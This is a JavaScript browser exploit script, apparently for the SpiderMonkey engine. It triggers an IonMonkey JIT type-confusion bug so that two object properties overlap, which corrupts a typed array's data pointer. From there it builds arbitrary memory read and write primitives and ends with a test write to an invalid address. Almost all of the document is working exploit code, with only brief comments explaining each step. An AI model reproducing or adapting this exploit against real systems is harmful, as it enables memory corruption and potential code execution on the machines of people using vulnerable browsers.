/* util Functions*/
String.prototype.rjust = function rjust(n,chr){
  chr = chr || '0'
  if(this.length>n)
    return this.toString();
  return (chr.repeat(n)+this.toString()).slice(-1*n);
}

String.prototype.ljust = function ljust(n,chr){
  chr = chr || '0'
  if(this.length>n)
    return this.toString();
  return (this.toString()+chr.repeat(n)).slice(0,n);
}

String.prototype.hexdecode = function hexdecode(){
  inp=this.toString();
  if (this.length%2 !=0)
  inp='0'+inp.toString();
  out=[];
  for(var i=0;i<inp.length;i+=2)
  out.push(parseInt(inp.substr(i,2),16));
  return out;
}

function tobytearray(inp) {
  inp=inp.replace("0x",'');
  inp=inp.rjust(16);
  bytes=new Uint8Array(inp.hexdecode());
  return bytes;
}

function print1(num){
  rep='';
  for(var i=0;i<8;i++){
    rep+=num[i].toString(16).rjust(2);
  }
  console.log("0x"+rep.rjust(16));
}

function split(inp){
  inp = inp.replace("0x",'');
  inp = inp.ljust(16);
  sub1 = "0x" + inp.substring(0,8);
  sub2 = "0x" + inp.substring(8);
  return [sub1, sub2]
}

/*util ends */


buf = []
buf.push(new ArrayBuffer(0x20));
buf.push(new ArrayBuffer(0x20));
buf.push(new ArrayBuffer(0x20));
buf.push(new ArrayBuffer(0x20));
buf.push(new ArrayBuffer(0x20));
buf.push(new ArrayBuffer(0x20));
buf.push(new ArrayBuffer(0x20));
buf.push(new ArrayBuffer(0x20));
buf.push(new ArrayBuffer(0x20));
buf.push(new ArrayBuffer(0x20));

var abuf = buf[5];
victim = new Uint32Array(abuf);
victim.fill(0x45464645);

let ab = new ArrayBuffer(0x1000);
   function Hax(val, l, trigger) {
       // In the final invocation:

       // Ultimately confuse these two objects which each other.
       // x will (eventually) be an UnboxedObject, looking a bit like an ArrayBufferView object... :)
       let x = {slots: 13.37, elements: 13.38, buffer: ab, length: 13.39, byteOffset: 13.40, data: []};
       // y is a real ArrayBufferView object.
       let y = new Uint32Array(0x20);

       // * Trigger a conversion of |this| to a NativeObject.
       // * Update Hax's template type to NativeObject with .a and .x (and potentially .y)
       // * Trigger the "roll back" of |this| to a NativeObject with only property .a
       // * Bailout of the JITed code due to type inference changes
       this.a = val;

       // Trigger JIT compilation and OSR entry here. During compilation, IonMonkey will
       // incorrectly assume that |this| already has the final type (so already has property .x)
       for (let i = 0; i < l; i++) {}

       // The JITed code will now only have a property store here and won't update the Shape.
       this.x = x;

       if (trigger) {
           // This property definition is conditional (and rarely used) so that an inline cache
           // will be emitted for it, which will inspect the Shape of |this|. As such, .y will
           // be put into the same slot as .x, as the Shape of |this| only shows property .a.
           this.y = y;

           // At this point, .x and .y overlap, and the JITed code below believes that the slot
           // for .x still stores the UnboxedObject while in reality it now stores a Float64Array.
       }

       // This assignment will then corrupt the data pointer of the Float64Array to point to |victim|.
       this.x.data = victim;
   }

   for (let i = 0; i < 100000; i++) {
       new Hax(1337, 1, false);
   }
   let obj = new Hax("asdf", 10000000, true);

   let driver = obj.y;

   // --------------------- rw primitive --------------------
   // size
   // driver[10] = 0x80;

   // data pointer of victim at index 14 15 of driver
   // driver[14] = 0x41414141;
   // driver[15] = 0x00004141;

   function read(addr) { // addr is a string e.g 0x414141414141
     sub = split(addr);
     driver[15] = parseInt(sub[0]);
     driver[14] = parseInt(sub[1]);
     return victim.slice(0,2);
   }

   function write(addr, value) {
     sub = split(addr);
     driver[15] = parseInt(sub[0]);
     driver[14] = parseInt(sub[1]);
     val = split(value);
     victim[0] = val[0];
     victim[1] = val[1];
   }

   function read_n(addr, n) { // read n * 4 bytes
     // n should be smaller than 2^32-1
     driver[10] = n;
     sub = split(addr);
     driver[15] = parseInt(sub[0]);
     driver[14] = parseInt(sub[1]);
     return victim.slice(0,n);
   }

   // test
   write("0x414141414141", "0x00001000");
   // SIGSEV